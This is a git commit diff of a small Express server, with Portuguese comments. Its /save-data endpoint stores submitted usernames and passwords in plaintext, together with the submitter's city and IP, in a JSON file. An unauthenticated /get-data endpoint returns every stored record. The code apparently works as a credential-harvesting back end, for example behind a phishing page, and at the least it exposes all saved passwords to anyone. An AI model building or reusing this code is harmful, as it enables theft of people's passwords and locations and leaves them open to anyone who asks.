bf07c5cb136b12029c626da74d2dac9e2d25e581
whmer <thekym50@gmail.com>
2024-10-27 18:37:20 -0300

    the-I

--- index.js
+++ index.js
@@ -5,23 +5,33 @@ const app = express();
 const PORT = 3000;
 
 app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static('isah')); 
+app.use(express.static('isah'));
 
 app.post('/save-data', (req, res) => {
-    const { username, password } = req.body;
-    const data = { username, password };
+    const { username, password, city, ip } = req.body;
 
+    // Lê o conteúdo existente do arquivo
+    let data = {};
+    if (fs.existsSync('userData.json')) {
+        const rawData = fs.readFileSync('userData.json', 'utf8');
+        data = JSON.parse(rawData);
+    }
+
+    // Adiciona ou substitui o conteúdo
+    data[username] = { username, password, city, ip };
+
+    // Salva o conteúdo atualizado no arquivo
     fs.writeFileSync('userData.json', JSON.stringify(data, null, 2));
     res.send('Dados salvos com sucesso!');
 });
+
 app.get('/get-data', (req, res) => {
     fs.readFile('userData.json', 'utf8', (err, data) => {
         if (err) {
             console.error('Erro ao ler o arquivo:', err);
             return res.status(500).send('Erro ao ler os dados do usuário');
         }
-        res.json(JSON.parse(data));
+        res.json(JSON.parse(data)); // Envia o JSON com os dados do usuário
     });
 });
 
